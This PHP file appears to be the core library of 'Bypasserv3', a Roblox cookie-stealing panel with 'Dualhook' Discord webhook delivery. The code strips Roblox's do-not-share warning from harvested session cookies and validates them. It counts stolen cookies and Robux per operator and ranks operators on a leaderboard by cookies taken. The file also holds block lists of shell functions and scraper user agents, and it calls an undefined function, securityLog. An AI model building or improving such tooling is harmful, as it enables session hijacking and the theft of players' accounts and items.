<?php
/**
 * Bypasserv3 - Core Functions - UPDATED
 * All utility and security functions with Dualhook support
 */

if (!defined('CONFIG_LOADED')) {
    die('Direct access not permitted');
}

// ============================================
// WEBHOOK VALIDATION & SENDING
// ============================================

/**
 * Validate Discord webhook URL
 */
function validateWebhook($url) {
    return preg_match('/^https:\/\/(discordapp\.com|discord\.com)\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/', $url) === 1;
}

/**
 * Send Discord webhook notification
 */
function sendWebhookNotification($webhookUrl, $payload) {
    if (empty($webhookUrl) || !validateWebhook($webhookUrl)) {
        return false;
    }
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    if ($httpCode >= 200 && $httpCode < 300) {
        return true;
    }
    
    error_log("Webhook notification failed - HTTP $httpCode: " . ($curlError ?: $response));
    return false;
}

// ============================================
// INPUT SANITIZATION (EXISTING)
// ============================================

/**
 * Sanitize user input
 */
function sanitizeInput($data) {
    if (is_array($data)) {
        return array_map('sanitizeInput', $data);
    }
    
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    
    // Block malicious patterns
    $patterns = [
        '/<script[^>]*>.*?<\/script>/is',
        '/<iframe[^>]*>.*?<\/iframe>/is',
        '/javascript:/i',
        '/on\w+\s*=/i',
        '/eval\s*\(/i',
        '/base64_decode/i',
        '/system\s*\(/i',
        '/exec\s*\(/i',
        '/shell_exec/i',
        '/passthru/i',
        '/`.*?`/s',
        '/\$\{.*?\}/s',
        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/i',
        '/<\?php/i',
        '/<\?=/i',
        '/\.\.\//i',
    ];
    
    foreach ($patterns as $pattern) {
        $data = preg_replace($pattern, '', $data);
    }
    
    return $data;
}

/**
 * Sanitize directory name
 */
function sanitizeDirectory($dir) {
    $dir = preg_replace('/[^a-zA-Z0-9_-]/', '', $dir);
    $dir = strtolower($dir);
    return $dir;
}

/**
 * Validate cookie format
 */
function validateCookie($cookie) {
    $cookie = trim($cookie);
    
    $cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
    
    if (strlen($cookie) < 500 || strlen($cookie) > 2000) {
        return false;
    }
    
    $maliciousPatterns = [
        '/[<>"\']/',
        '/javascript:/i',
        '/<script/i',
        '/\.\.\//i',
        '/union\s+select/i',
        '/drop\s+table/i',
        '/insert\s+into/i',
        '/delete\s+from/i',
        '/update\s+.*set/i',
        '/eval\s*\(/i',
        '/base64_decode/i',
        '/system\s*\(/i',
        '/exec\s*\(/i',
        '/shell_exec/i',
        '/passthru/i',
        '/`.*?`/s',
        '/\$\{.*?\}/s',
        '/<\?php/i',
        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/i',
        '/file_get_contents/i',
        '/file_put_contents/i',
        '/fopen/i',
        '/curl_exec/i',
        '/proc_open/i',
    ];
    
    foreach ($maliciousPatterns as $pattern) {
        if (preg_match($pattern, $cookie)) {
            securityLog('MALICIOUS_COOKIE_DETECTED', ['pattern' => $pattern]);
            return false;
        }
    }
    
    return true;
}

// ============================================
// INSTANCE MANAGEMENT (EXISTING)
// ============================================

/**
 * Get instance data
 */
function getInstanceData($directory) {
    $filePath = DATA_PATH . 'instances/' . sanitizeDirectory($directory) . '.json';
    
    if (!file_exists($filePath)) {
        return null;
    }
    
    $data = json_decode(file_get_contents($filePath), true);
    return $data;
}

/**
 * Save instance data
 */
function saveInstanceData($directory, $data) {
    $dir = DATA_PATH . 'instances/';
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    
    $filePath = $dir . sanitizeDirectory($directory) . '.json';
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
}

/**
 * Check if directory exists
 */
function directoryExists($directory) {
    $filePath = DATA_PATH . 'instances/' . sanitizeDirectory($directory) . '.json';
    return file_exists($filePath);
}

/**
 * Update instance stats
 */
function updateInstanceStats($directory, $key, $value) {
    $data = getInstanceData($directory);
    if ($data) {
        $data['stats'][$key] = $value;
        saveInstanceData($directory, $data);
    }
}

/**
 * Update daily stats
 */
function updateDailyStats($directory, $key, $value) {
    $data = getInstanceData($directory);
    if ($data) {
        $today = date('w');
        $data['dailyStats'][$key][$today] += $value;
        saveInstanceData($directory, $data);
    }
}

// ============================================
// GLOBAL STATS (EXISTING)
// ============================================

/**
 * Get global stats
 */
function getGlobalStats() {
    $filePath = DATA_PATH . 'global_stats.json';
    
    if (!file_exists($filePath)) {
        return [
            'totalSites' => 0,
            'totalInstances' => 0,
            'totalCookies' => 0,
            'totalVisits' => 0,
            'lastUpdated' => time()
        ];
    }
    
    return json_decode(file_get_contents($filePath), true);
}

/**
 * Update global stats
 */
function updateGlobalStats($key, $increment = 1) {
    $stats = getGlobalStats();
    $stats[$key] = ($stats[$key] ?? 0) + $increment;
    $stats['lastUpdated'] = time();
    
    file_put_contents(DATA_PATH . 'global_stats.json', json_encode($stats, JSON_PRETTY_PRINT));
}

// ============================================
// SECURITY & RATE LIMITING (EXISTING)
// ============================================

/**
 * Get user IP
 */
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

/**
 * Check rate limit
 */
function checkRateLimit($ip, $requests = 50, $window = 3600) {
    $filePath = DATA_PATH . 'rate_limits.json';
    $limits = [];
    
    if (file_exists($filePath)) {
        $limits = json_decode(file_get_contents($filePath), true) ?? [];
    }
    
    $now = time();
    $key = md5($ip);
    
    if (isset($limits[$key])) {
        $limit = $limits[$key];
        if ($now - $limit['start'] < $window) {
            if ($limit['count'] >= $requests) {
                return false;
            }
            $limits[$key]['count']++;
        } else {
            $limits[$key] = ['start' => $now, 'count' => 1];
        }
    } else {
        $limits[$key] = ['start' => $now, 'count' => 1];
    }
    
    file_put_contents($filePath, json_encode($limits));
    return true;
}

/**
 * Log security event
 */
function logSecurityEvent($event, $data = []) {
    $log = [
        'timestamp' => date('c'),
        'event' => $event,
        'data' => $data
    ];
    
    $filePath = DATA_PATH . 'security_log.json';
    $logs = [];
    
    if (file_exists($filePath)) {
        $logs = json_decode(file_get_contents($filePath), true) ?? [];
    }
    
    $logs[] = $log;
    
    if (count($logs) > 1000) {
        $logs = array_slice($logs, -500);
    }
    
    file_put_contents($filePath, json_encode($logs, JSON_PRETTY_PRINT));
}

/**
 * Check for suspicious requests
 */
function isSuspiciousRequest() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    $suspicious = [
        'curl',
        'wget',
        'python',
        'scrapy',
        'bot',
        'spider'
    ];
    
    foreach ($suspicious as $pattern) {
        if (stripos($userAgent, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

/**
 * Security scan
 */
function securityScan($log = false) {
    if ($log) {
        logSecurityEvent('security_scan', ['type' => 'automatic']);
    }
}

/**
 * Cleanup rate limits
 */
function cleanupRateLimits() {
    $filePath = DATA_PATH . 'rate_limits.json';
    
    if (!file_exists($filePath)) {
        return;
    }
    
    $limits = json_decode(file_get_contents($filePath), true) ?? [];
    $now = time();
    
    foreach ($limits as $key => $limit) {
        if ($now - $limit['start'] > 3600) {
            unset($limits[$key]);
        }
    }
    
    file_put_contents($filePath, json_encode($limits));
}

/**
 * Get leaderboard
 */
function getLeaderboard($limit = 5) {
    $instancesDir = DATA_PATH . 'instances/';
    $instances = [];
    
    if (!is_dir($instancesDir)) {
        return [];
    }
    
    $files = scandir($instancesDir);
    
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        
        $data = json_decode(file_get_contents($instancesDir . $file), true);
        if ($data) {
            $instances[] = [
                'directory' => $data['directory'],
                'totalCookies' => $data['stats']['totalCookies'] ?? 0,
                'totalRobux' => $data['stats']['totalRobux'] ?? 0
            ];
        }
    }
    
    usort($instances, function($a, $b) {
        return $b['totalCookies'] - $a['totalCookies'];
    });
    
    return array_slice($instances, 0, $limit);
}

/**
 * Get rank info
 */
function getRankInfo($totalCookies) {
    if ($totalCookies >= 1000) return ['rank' => '🏆 Diamond', 'color' => '#00CED1'];
    if ($totalCookies >= 500) return ['rank' => '👑 Platinum', 'color' => '#E5E4E2'];
    if ($totalCookies >= 250) return ['rank' => '🥇 Gold', 'color' => '#FFD700'];
    if ($totalCookies >= 100) return ['rank' => '🥈 Silver', 'color' => '#C0C0C0'];
    if ($totalCookies >= 50) return ['rank' => '🥉 Bronze', 'color' => '#CD7F32'];
    return ['rank' => '⭐ Starter', 'color' => '#FFC700'];
}

?>
